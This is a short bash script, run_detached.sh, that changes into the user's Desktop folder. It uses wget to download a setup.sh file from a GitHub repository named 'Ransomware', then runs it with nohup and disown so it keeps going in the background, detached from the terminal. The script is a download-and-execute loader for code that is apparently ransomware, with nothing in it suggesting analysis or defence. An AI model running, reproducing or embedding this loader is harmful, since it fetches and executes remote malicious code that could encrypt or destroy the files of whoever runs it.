# run_detached.sh
#!/bin/bash
DESKTOP="$HOME/Desktop"
LOG="$DESKTOP/setup.log"
SCRIPT_URL="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/setup.sh"
SCRIPT="$DESKTOP/setup.sh"

echo "[*] Running setup on: $DESKTOP"
cd "$DESKTOP" || { echo "Failed to cd $DESKTOP"; exit 1; }

# Download Python files
echo "[*] Downloading setup file..."
wget --show-progress --timeout=15 --tries=2 "${SCRIPT_URL}" -O "${SCRIPT}"

# run in background, detach from terminal
nohup bash "$SCRIPT" > "$LOG" 2>&1 & disown

